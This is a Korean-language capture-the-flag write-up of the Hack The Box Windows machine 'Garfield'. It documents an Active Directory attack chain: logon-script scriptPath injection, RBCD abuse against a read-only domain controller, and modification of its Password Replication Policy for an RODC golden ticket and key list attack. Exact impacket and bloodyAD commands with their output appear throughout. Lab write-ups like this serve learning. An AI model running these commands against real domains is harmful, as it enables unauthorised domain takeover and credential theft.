![Garfield](/assets/htb-windows/garfield/garfield.png)

**Garfield**는 Hard 난이도의 Windows 머신으로, 초기에는 제공된 `j.arbuckle` 계정으로 도메인과 `SMB/SYSVOL` 을 열람하며 시작된다. 

`bloodyAD` 로 쓰기 가능한 객체를 확인한 결과 `l.wilson` 및 `l.wilson_adm` 계정에 대한 제어 가능성을 발견하고, SYSVOL의 로그인 스크립트 경로에 악성 배치 파일을 업로드한 뒤 `l.wilson` 의 **scriptPath를 조작해 리버스 셸을 획득**한다. 

`l.wilson` 권한으로 `l.wilson_adm` 의 비밀번호를 재설정하고 WinRM을 통해 관리자 계정으로 수평 이동한다. 

내부 정찰 과정에서 RODC01이 별도 내부망에 존재하는 것을 확인하였고, `l.wilson_adm` 이 RODC 관련 권한과 **SeMachineAccountPrivilege** 를 가진 점을 이용해 `RBCD$` 컴퓨터 계정을 생성한 후, RBCD를 설정하여 `Administrator` 로 가장한 `HTTP/RODC01.garfield.htb` 서비스 티켓을 발급받고, Ligolo로 내부망 터널을 구성하여 RODC01에 `Administrator` 권한으로 접근한다.

RODC01에서는 **SeBackupPrivilege** 를 이용해 `ntds.dit` 와 `SYSTEM` 하이브를 덤프하고, `secretsdump` 를 통해 RODC 전용 `krbtgt_8245` 계정의 NTLM 해시를 획득한다.

마지막으로 RODC01 객체의 PRP를 수정한 뒤, Rubeus를 이용해 **RODC Golden Ticket 및 Key List 공격**을 수행하여 도메인 `Administrator` 의 NTLM 해시를 획득한다.

최종적으로 획득한 **Administrator 해시로 WinRM에 접속**하여 Domain Administrator 권한을 획득한다.

## Discovering Writable User Object

`SeBatchLogonRight` 는 사용자가 배치 작업 방식으로 로그온할 수 있도록 허용하는 권한이다.

따라서 `l.wilson` 계정이 작업 스케줄러와 같은 실행 환경에서 사용될 가능성을 의심할 수 있었다.

우선 현재 계정으로 도메인 객체에 대한 쓰기 권한을 확인하기 위해 [bloodyAD](https://github.com/CravateRouge/bloodyAD)를 사용하였다:

즉, `j.arbuckle` 계정으로 `l.wilson` 사용자 객체의 속성을 수정할 수 있는 상태였다.

# Exploitation

## Logon Script Injection

먼저 SYSVOL 공유의 `garfield.htb\scripts` 디렉터리에 파일 업로드가 가능한지 확인하였다:

```text
smb: \garfield.htb\scripts\> put test

putting file test as \garfield.htb\scripts\test (0.0 kB/s) (average 0.0 kB/s)
```

```text
smb: \garfield.htb\scripts\> ls

  .                                   D        0  Thu May 21 17:48:01 2026
  ..                                  D        0  Thu May 21 17:48:01 2026
  printerDetect.bat                   A     1361  Thu May 21 17:06:03 2026
  test                                A        4  Thu May 21 17:48:01 2026

                9250815 blocks of size 4096. 990548 blocks available
```

AD 사용자 객체의 `scriptPath` 속성은 사용자의 로그온 스크립트 경로를 지정하는 속성이다.

앞서 확인한 것처럼 현재 계정은 `l.wilson` 사용자 객체에 대해 `WRITE` 권한을 가지고 있었으므로, `l.wilson` 의 `scriptPath` 값을 조작할 수 있었다.

일반적으로 `scriptPath`에 지정된 로그온 스크립트는 `NETLOGON` 공유를 기준으로 참조된다.

[ServerFault의 관련 답변](https://serverfault.com/questions/773568/store-gpo-scripts-in-netlogon-or-policy-folder)을 참고하게 되면, `SYSVOL\garfield.htb\scripts` 경로는 도메인 로그온 스크립트가 위치하는 `NETLOGON` 공유와 연결되는 위치이다.

따라서 해당 디렉터리에 `.bat` 파일을 업로드하면, 도메인 내부에서는 `\\garfield.htb\NETLOGON\~.bat` 형태로 참조될 수 있다.

또한 `l.wilson` 은 `SeBatchLogonRight` 권한을 가지고 있었기 때문에, 해당 계정이 배치 작업이나 예약 작업 실행 흐름에서 사용될 가능성이 있었다.

따라서 `scriptPath` 값을 `printerDetect.bat` 로 설정하고, 같은 이름의 `.bat` 파일을 `SYSVOL\garfield.htb\scripts` 경로에 업로드하면, `l.wilson` 의 실행 흐름에서 해당 `.bat` 파일이 실행될 가능성이 있다고 판단하였다.

### Abusing ForceChangePassword

### Abusing RBCD Against RODC01

우선 `l.wilson_adm` 계정으로 RODC01의 DNS 정보를 확인하였다:

```text
PS C:\Users\l.wilson_adm\Documents> nslookup RODC01.garfield.htb

Server:  localhost
Address:  127.0.0.1

Name:    RODC01.garfield.htb
Address:  192.168.100.2
```

이를 통해 RODC01이 내부망에 존재함을 확인할 수 있었다.

앞서 BloodHound에서 확인한 [WriteAccountRestrictions](https://specterops.io/blog/2025/10/01/writeaccountrestrictions-war-what-is-it-good-for/) 권한은 `User-Account-Restrictions` 속성 집합에 대한 쓰기 권한으로, 여러 계정 제한 관련 속성에 영향을 줄 수 있다. 

이 중 공격적으로 중요한 속성이 RBCD에 사용되는 **msDS-AllowedToActOnBehalfOfOtherIdentity**이다.

RBCD는 대상 컴퓨터 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성을 조작하여, 특정 보안 주체가 해당 컴퓨터의 서비스에 대해 다른 사용자를 대신해 접근할 수 있도록 허용하는 방식이다.

따라서 `RODC01$` 객체의 해당 속성에 공격자가 제어하는 컴퓨터 계정을 등록하거나, SPN이 설정된 사용자 계정을 위임 주체로 등록할 수 있다면, **S4U2Self/S4U2Proxy** 과정을 수행하고 `RODC01$` 의 서비스에 대해 특정 사용자를 가장한 서비스 티켓을 발급받을 수 있다.

> S4U2Self는 컴퓨터/서비스 계정이 특정 사용자를 가장하여 자기 자신에게 향하는 TGS를 발급받는 과정이다. 그리고 S4U2Proxy는 S4U2Self로 발급받은 TGS를 증거 티켓으로 사용하여, 해당 사용자를 대신해 특정 SPN에 접근할 수 있는 새로운 TGS를 발급받는 과정이다.

> BloodHound에서 확인했듯이 `l.wilson_adm` 유저는 `RODC01$` 컴퓨터 계정의 비밀번호를 변경할 수 있는 권한을 가지고 있었다.

> 이론적으로 `RODC01$` 계정으로 인증할 수 있고, 해당 계정에 필요한 위임 조건이 충족되어 있다면 S4U2Self/S4U2Proxy를 통해 `RODC01` 의 서비스 티켓 발급을 시도할 수 있다. 하지만 이를 위해 `RODC01$` 의 비밀번호를 변경하면, KDC가 티켓을 발급할 때 사용하는 키와 실제 RODC01 서버가 티켓을 복호화할 때 사용하는 로컬 컴퓨터 계정 키가 달라지게 된다. 이 경우 티켓은 발급되더라도 실제 인증 단계에서 복호화가 실패하므로 접근이 불가능하다.

> 따라서 `RODC01$` 의 비밀번호는 직접 변경하지 않고, 공격자가 제어 가능한 컴퓨터 계정을 새로 생성한 뒤, 해당 계정이 RODC01에 대해 사용자를 대리할 수 있도록 대상 객체의 속성을 조작하는 방식으로 진행하였다.

우선 [impacket](https://github.com/fortra/impacket/tree/master)의 `addcomputer` 를 이용해 공격자가 제어할 컴퓨터 계정 `RBCD$` 를 생성하였다:

```bash
$ impacket-addcomputer garfield.htb/l.wilson_adm:'Asdf1234@' -dc-ip 10.129.244.207 -computer-name 'RBCD$' -computer-pass 'Asdf1234@'

[*] Successfully added machine account RBCD$ with password Asdf1234@.
```

이후 `impacket-rbcd` 를 사용하여 `RODC01$` 의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성에 `RBCD$` 를 등록하였다:

```bash
$ impacket-rbcd -action write garfield.htb/l.wilson_adm:'Asdf1234@' -delegate-from 'RBCD$' -delegate-to 'RODC01$' -dc-ip 10.129.244.207                                                           

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] RBCD$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCD$        (S-1-5-21-2502726253-3859040611-225969357-11102)
```

속성을 확인하면 `RBCD$` 의 SID가 `msDS-AllowedToActOnBehalfOfOtherIdentity` 에 등록된 것을 볼 수 있다:

```bash

distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-2502726253-3859040611-225969357-11102)
```

현재 `RODC01$` 의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성에는 `RBCD$` 의 SID가 들어간 상태이다. 

쉽게 말하면, RODC01 입장에서는 `RBCD$` 가 자신을 대상으로 다른 사용자를 대신해 접근할 수 있는 주체로 등록된 것이다.

따라서 `RBCD$` 계정으로 DC에게 `Administrator` 를 가장한 `HTTP/RODC01.garfield.htb` 서비스 티켓을 요청하면, DC는 RODC01 객체의 RBCD 설정을 확인한다. 

이때 RODC01 객체의 RBCD 설정에 `RBCD$` 가 등록되어 있으므로, DC는 해당 요청을 허용하고 `Administrator` 권한의 HTTP 서비스 티켓을 발급해준다.

### RODC Golden Ticket and PRP Abuse

현재 `krbtgt_8245` 의 해시를 확보했기 때문에, RODC01이 발급한 것처럼 보이는 **RODC Golden Ticket**을 위조할 수 있는 상태이다.

DC01이 `Administrator` 와 같은 도메인 계정의 비밀번호 정보를 RODC01에 제공해도 되는지는, RODC01 컴퓨터 객체에 설정된 **Password Replication Policy(PRP)**에 의해 결정된다. 

이 정책은 주로 `msDS-RevealOnDemandGroup` 과 `msDS-NeverRevealGroup` 속성을 통해 관리되며, 어떤 계정의 비밀번호 정보를 RODC01에 저장할 수 있는지 판단하는 기준이 된다. 

> 자세한 내용은 [Microsoft RODC Object 문서](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/73d11ea7-e634-453e-944d-559654cc91c5)를 참고하였다.

`msDS-NeverRevealGroup` 속성은 해당 RODC에 비밀번호 정보를 캐시하면 안 되는 사용자 또는 그룹을 의미하고, `msDS-RevealOnDemandGroup` 속성은 해당 RODC에 비밀번호 정보를 캐시할 수 있는 사용자 또는 그룹을 의미한다.

만약 `Administrator` 가 `msDS-NeverRevealGroup` 에 의해 제한되지 않고, `msDS-RevealOnDemandGroup` 에 포함되어 있다면, `krbtgt/garfield.htb` SPN을 대상으로 한 key list 요청을 통해 해당 계정의 비밀번호 정보를 요청할 수 있다.

왜냐하면 `krbtgt_8245` 해시로 위조한 `Administrator` 티켓은 DC01 입장에서 RODC01의 `krbtgt_8245` 키로 서명된 티켓처럼 검증될 수 있기 때문이다.

따라서 DC01은 해당 티켓의 사용자를 `Administrator` 로 인식할 수 있다.

> `cifs`, `HTTP` 와 같은 일반 SPN에 대한 TGS 요청은 `Administrator` 신분으로 해당 서비스에 접근하기 위한 서비스 티켓을 요청하는 과정이다. 

> 예를 들어 `cifs/dc01.garfield.htb` 는 `Administrator` 로 DC01의 파일 공유 서비스에 접근하기 위한 티켓을 의미한다. 

> 하지만 현재 위조한 티켓은 RODC01의 `krbtgt_8245` 키로 서명된 티켓이므로, DC01은 이를 일반 도메인 `krbtgt` 가 발급한 TGT로 처리하지 않는다.

> 따라서 이 공격에서는 일반 서비스 SPN이 아니라 `krbtgt/garfield.htb` 를 대상으로 한 key list 요청이 필요하다.

이 요청은 일반 서비스 접근용 TGS 요청과 달리, 특정 사용자(`Administrator`)의 비밀번호 정보를 요청하는 특수한 Kerberos 흐름이다.

`bloodyAD` 를 통해 위 속성들을 확인하면 다음과 같다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' get object 'RODC01$' --attr msDS-NeverRevealGroup

msDS-NeverRevealGroup: CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb; CN=Account Operators,CN=Builtin,DC=garfield,DC=htb; CN=Server Operators,CN=Builtin,DC=garfield,DC=htb; CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb; CN=Administrators,CN=Builtin,DC=garfield,DC=htb
```

이처럼 비밀번호 정보 캐시가 허용되지 않는 대상에 `CN=Administrators,CN=Builtin,DC=garfield,DC=htb` 그룹이 포함되어 있었다.

또한 `msDS-RevealOnDemandGroup` 속성을 확인하면 다음과 같다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' get object 'RODC01$' --attr msDS-RevealOnDemandGroup

msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
```

허용 목록에는 `Allowed RODC Password Replication Group` 만 존재한다.

따라서 현재 상태에선 `krbtgt_8245` 를 이용해 RODC Golden Ticket을 위조하더라도, DC01의 `Administrator` NTLM 해시를 캐내는 것은 불가능하다. 

하지만 처음에 보았던 `l.wilson_adm` 사용자 관련하여 `RODC Administrators` 그룹에 대해 **AddSelf** 권한을 가지고 있었다.

`l.wilson_adm` 을 RODC Administrators 그룹에 추가하면, RODC01 객체의 PRP 관련 속성을 수정할 수 있는 권한을 확보할 수 있다.

따라서 `RODC Administrators` 권한으로 RODC01 객체의 PRP를 수정한 뒤, `krbtgt_8245` 기반 Administrator RODC Golden Ticket으로 `krbtgt/garfield.htb` SPN에 key list 요청을 수행하면, DC01은 수정된 PRP를 기준으로 `Administrator` 의 NTLM 해시를 응답에 포함할 수 있다.

### RODC Golden Ticket Abuse

#### PRP Modification

우선 `l.wilson_adm` 사용자를 `RODC Administrators` 그룹에 추가하였다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' add groupMember 'RODC Administrators' l.wilson_adm

[+] l.wilson_adm added to RODC Administrators
```

정상적으로 추가된 것을 확인하였다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' get object 'RODC Administrators' --attr member

member: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
```

이후 `msDS-NeverRevealGroup` 속성 값을 비워, RODC01에 비밀번호 정보를 캐시하면 안 되는 제한 대상을 제거하였다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' set object 'RODC01$' msDS-NeverRevealGroup 

[+] RODC01$'s msDS-NeverRevealGroup has been updated
```

삭제 이후 해당 속성이 비워진 것을 확인하였다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' get object 'RODC01$' --attr msDS-NeverRevealGroup
```

이후 `msDS-RevealOnDemandGroup` 속성에 `Administrator` 객체를 추가하였다. 기존 허용 그룹인 `Allowed RODC Password Replication Group` 도 함께 유지하였다.

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' set object RODC01$ msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb' 

[+] RODC01$'s msDS-RevealOnDemandGroup has been updated
```

속성을 다시 확인하면 `Administrator` 가 추가된 것을 확인할 수 있다:

```bash
$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Asdf1234@' get object 'RODC01$' --attr msDS-RevealOnDemandGroup

msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb; CN=Administrator,CN=Users,DC=garfield,DC=htb
```

이로써 DC01이 RODC01에 `Administrator` 의 비밀번호 정보를 제공해도 되는 PRP 상태가 되었다.
